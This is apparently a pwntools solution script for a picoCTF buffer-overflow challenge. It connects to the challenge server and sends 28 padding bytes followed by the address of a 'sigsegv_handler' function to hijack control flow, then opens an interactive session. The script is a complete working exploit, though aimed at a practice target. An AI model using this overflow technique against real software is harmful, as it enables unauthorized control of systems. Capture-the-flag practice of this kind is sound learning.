from pwn import *

context.update(arch='i386', os='linux')

binary_path = './vuln'

host = 'saturn.picoctf.net'
port = 55984

p = remote(host, port)

elf = ELF(binary_path)

address = elf.symbols['sigsegv_handler']

p.sendline(b'A' * 28 + p32(int(hex(address), 16)))

p.interactive()

# print((hex(address))) # 0x130d \x0d\x13\x00\x00